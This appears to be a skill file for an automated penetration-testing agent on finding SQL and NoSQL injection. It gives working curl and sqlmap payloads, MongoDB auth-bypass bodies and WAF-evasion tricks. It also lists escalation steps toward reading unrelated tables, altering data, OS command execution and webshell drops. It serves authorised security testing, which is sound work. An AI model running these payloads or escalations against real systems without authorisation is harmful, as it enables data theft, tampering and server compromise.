---
name: sqli
description: >
  Hunt for SQL injection vulnerabilities: classic (error/union-based), blind boolean,
  blind time-based, second-order, and NoSQL injection (MongoDB, etc). Use when a parameter
  reaches a database query — search boxes, filters, sort/order params, login forms, API
  query params, JSON bodies, headers (X-Forwarded-For, User-Agent) logged to DB.
  Keywords: sqli, SQL injection, union select, sqlmap, blind sqli, NoSQL injection,
  MongoDB operator injection, second-order sqli, mysql error, ORM injection.
  Do NOT use for command injection at OS level — use rce. Do NOT use for template
  expression injection — use ssti. Do NOT use for XML-based injection — use xxe.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-89, CWE-943]
  mitre_attack: [T1190]
  tools: [sqlmap, nuclei, ffuf, curl, burp, nosqlmap]
depends_on: [active-recon, web-crawling, fuzzing]
feeds_into: [chain-analysis, exfil-data, auth-bypass]
chains_with: [auth-bypass, info-disclosure, rce]
---

## Signals

- Numeric/string params that feed `WHERE`, `ORDER BY`, `LIMIT`, or filter clauses: `id`, `sort`,
  `category`, `page`, `search`, `q`.
- Error pages leaking DB stack traces (ODBC, `mysqli_`, `pg_query`, `ORA-`, `SQLSTATE`).
- Response time variance when injecting `SLEEP()`/`WAITFOR DELAY` payloads.
- JSON/REST APIs where the same param name appears across endpoints (likely shared ORM query
  builder — one injectable endpoint often means siblings are too).
- MongoDB/NoSQL backends: params echoed into `$where`, `$regex`, or accepted as raw JSON bodies
  (`{"user": {"$ne": null}}` style auth bypass candidates).
- Second-order candidates: data stored now (profile name, order note) and rendered later in an
  admin panel, report, or export — the injection fires on *read*, not *write*.
- **JSON parameter type confusion**: APIs that pass column names or sort fields in JSON bodies
  may use type-casting syntax (`column::int` in Postgres, `CAST(column AS int)` in MSSQL).
  A type-cast error on a legitimate column name (`customerName::int`) reveals injection into
  the query's column/expression context — not value context, so standard quote-based payloads
  miss it. Test by appending `::int` or similar casts to string-typed JSON parameters.

## Response-time profiling as a discovery signal

Before injecting anything, baseline response times per endpoint and parameter.
Significant deviations from the baseline (even without explicit payloads) can
reveal backend query complexity, heavy joins, or unindexed lookups that hint at
injectable paths. This is especially valuable for:
- Endpoints where boolean/error-based signals are suppressed (custom error pages,
  uniform 200 responses).
- Parameters that feed `ORDER BY` or aggregate clauses (no error, but timing shifts
  with different values).
- APIs behind WAFs that normalize payloads but can't hide timing side-channels.

```bash
for param in "id=1" "id=99999" "sort=name" "sort=name;--"; do
  echo -n "$param: "; curl -s -o /dev/null -w '%{time_total}' "https://target/api?${param}"
  echo
done
```

## Prerequisites

- At least one parameter you can control that is plausibly used in a query (not just displayed —
  check it affects result set size/order/filtering, which hints at DB involvement vs. pure
  template rendering).
- Baseline response captured (status, length, timing) for a *valid* value before testing.
- For blind/OOB: a listener or DNS you control if the target may support out-of-band exfil
  (`xp_cmdshell`, `UTL_HTTP`, `LOAD_FILE` into UNC paths on MSSQL/Oracle).

## Methodology

1. **Baseline & manual probe.** Capture the normal request/response. Throw single-quote and
   boolean payloads and diff against baseline:
   ```bash
   curl -s "https://target/app?id=1" -o base.html
   curl -s "https://target/app?id=1'" -o q1.html
   curl -s "https://target/app?id=1 AND 1=1" -o true.html
   curl -s "https://target/app?id=1 AND 1=2" -o false.html
   diff base.html q1.html; diff true.html false.html
   ```
   A diff on the AND 1=1 / AND 1=2 pair with no error = classic **boolean-blind** signal.

2. **Error-based confirmation.** Try quote/paren breakers and watch for DB errors:
   ```bash
   for p in "'" "\"" "' OR '1'='1" "1' AND '1'='2" "1) AND (1=1" "1;--"; do
     echo "== $p =="
     curl -s --get --data-urlencode "id=$p" "https://target/app" | grep -Eio "sql syntax|mysqli|ORA-[0-9]+|SQLSTATE|pg_query|ODBC|sqlite3\.OperationalError"
   done
   ```

3. **Time-based blind confirmation** (works even with identical responses):
   ```bash
   time curl -s "https://target/app?id=1" -o /dev/null
   time curl -s "https://target/app?id=1 AND SLEEP(5)" -o /dev/null          # MySQL
   time curl -s "https://target/app?id=1;WAITFOR DELAY '0:0:5'--" -o /dev/null  # MSSQL
   time curl -s "https://target/app?id=1 AND pg_sleep(5)--" -o /dev/null     # Postgres
   ```
   A consistent ~5s delay on the payload vs. baseline = confirmed time-blind SQLi.

4. **Automate confirmation and exploitation with sqlmap** once a manual signal exists (don't
   run sqlmap blind against everything — it's noisy and gets WAF-blocked):
   ```bash
   sqlmap -u "https://target/app?id=1" --batch --level=3 --risk=2 \
     --technique=BEUSTQ --dbms=mysql -p id --random-agent

   # with session cookie for authenticated endpoints
   sqlmap -u "https://target/app?id=1" --cookie="session=xyz" --batch \
     -p id --dbms=mysql --technique=BT --time-sec=3

   # POST body / JSON
   sqlmap -u "https://target/api/search" --data='{"q":"test"}' \
     --headers="Content-Type: application/json" --batch -p q

   # once confirmed injectable, go for proof, not full dump:
   sqlmap -u "https://target/app?id=1" --batch -p id --current-db --banner
   sqlmap -u "https://target/app?id=1" --batch -p id -D appdb --tables
   ```

5. **UNION-based manual exploitation** (when sqlmap confirms union is viable, or to build proof
   without full automation):
   ```bash
   curl -s "https://target/app?id=1 ORDER BY 1--"     # increment until error -> column count
   curl -s "https://target/app?id=-1 UNION SELECT 1,2,3--"
   curl -s "https://target/app?id=-1 UNION SELECT NULL,@@version,NULL--"
   curl -s "https://target/app?id=-1 UNION SELECT NULL,table_name,NULL FROM information_schema.tables--"
   ```

6. **Second-order injection.** Inject into a storage field (profile, order comment), then trigger
   the *read* path (admin report, invoice render, export job) and watch for errors/delay there,
   not on the write response:
   ```bash
   curl -s -b sess.txt -d "display_name=test' AND SLEEP(5)--" https://target/profile/update
   time curl -s -b admin_sess.txt https://target/admin/users/export  # delay fires here
   ```

7. **NoSQL injection (MongoDB).** Test operator injection via JSON body and via query-string
   bracket notation (common in Express/Mongoose apps):
   ```bash
   # auth bypass via operator injection
   curl -s -X POST https://target/login -H "Content-Type: application/json" \
     -d '{"username":"admin","password":{"$ne":"wrongpass"}}'
   curl -s -X POST https://target/login -H "Content-Type: application/json" \
     -d '{"username":{"$regex":"^adm"},"password":{"$ne":null}}'

   # query-string bracket notation (form-encoded parsers)
   curl -s "https://target/login?username=admin&password[\$ne]=x"

   # blind boolean via $where / regex timing
   curl -s -d 'username=admin&password[$regex]=^a' https://target/login

   # automate with NoSQLMap
   nosqlmap
   ```

8. **Nuclei sweep** across many hosts/params for known SQLi templates (cheap triage, not a
   substitute for manual confirmation):
   ```bash
   nuclei -l urls.txt -tags sqli -severity critical,high,medium -o nuclei_sqli.txt
   ```

## Tooling

- `sqlmap` — exploitation and automated technique/DBMS fingerprinting.
- `nuclei -tags sqli` — fast triage across many URLs.
- `ffuf` — param/value fuzzing with timing-diff detection (`-fr` for response regex, `-t` throttle
  to avoid WAF rate-limit false negatives).
- `NoSQLMap` — MongoDB/CouchDB-focused automation.
- Burp Suite Intruder with "Blind SQL injection" payload set for manual-grade time-based sweeps
  behind auth.

## Root Causes

- String concatenation into SQL instead of parameterized queries/prepared statements.
- ORMs with raw-query escape hatches (`Model.raw()`, `$queryRaw`, `.where(f"...")`) used for
  dynamic sort/filter columns.
- Stored procedures built via string concat on the DB side.
- NoSQL: user-controlled JSON/query-string parsed directly into query filters without type
  enforcement (allowing operators like `$ne`, `$gt`, `$regex` instead of scalar values).

## Validation Gate (minimum proof)

- **Boolean/error-based:** reproducible, consistent TRUE/FALSE response difference across ≥3
  trials, tied to a specific parameter and request.
- **Time-based:** delay matches injected value (5s payload → ~5s response, 10s → ~10s) across
  ≥2 trials, ruling out network jitter.
- **Data extraction:** at least one piece of DB-internal data retrieved that could not come from
  the application logic itself (DB version, table name, another user's data) — screenshot/log the
  exact request and response.
- **NoSQL:** demonstrate an auth bypass or data leak with the operator payload compared explicitly
  against the same request using a literal string (to rule out normal app behavior).

## Gotchas

- **Minimum proof, not full dump.** Extracting `@@version` or one row from `information_schema`
  is proof. Do not run `--dump-all`; it's unnecessary risk and out of scope for most ROEs.
- **Common N/A:** WAF/CDN normalizes or blocks quotes — test with encoded variants
  (`%27`, `/*!50000select*/`) before declaring not-injectable; also test headers
  (`X-Forwarded-For`, `User-Agent`, `Referer`) which often bypass param-level WAF rules.
- **Overclaim trap:** a slow response alone is not proof of time-based SQLi — always pair with a
  `SLEEP(0)`/fast-equivalent control request to rule out general app latency.
- **Overclaim trap:** UNION column-count errors can also come from app-level validation — confirm
  the error text is a genuine DB error, not a friendly 400 page.
- ORM-protected endpoints can still be injectable through *order by* / *column name* params where
  parameterization doesn't apply (identifiers can't be bound the same way as values).
- Second-order hits are easy to miss because the vulnerable *request* (the read trigger) looks
  completely benign — always re-test storage fields against downstream render paths.

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Data exfiltration scope** — Can you read arbitrary tables, not just the one touched by the vulnerable query? Enumerate information_schema and pull from unrelated tables.
2. **Integrity impact** — Can you write/update/delete data through the injection point, not just read it?
3. **OS command execution** — Can you reach xp_cmdshell (MSSQL), INTO OUTFILE/LOAD_FILE (MySQL), or COPY TO/FROM PROGRAM (Postgres) to execute OS commands?
4. **Local file read** — Can you read arbitrary local files via LOAD_FILE/UTL_FILE/pg_read_file?
5. **Blind fallback** — If inline/error-based extraction fails, can you achieve reliable time-based blind exfiltration (SLEEP-based, with a latency control to rule out network jitter)?

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- SQLi → **auth-bypass** (login bypass via boolean/NoSQL injection).
- SQLi → **info-disclosure** (schema/credential extraction feeding further recon).
- SQLi → **rce** (stacked queries enabling `xp_cmdshell` on MSSQL, `LOAD_FILE`/`INTO OUTFILE`
  webshell drop on MySQL with `FILE` privilege, Postgres `COPY TO/FROM PROGRAM`).
- Extracted credentials/hashes feed `chain-analysis` for lateral movement or further auth testing.
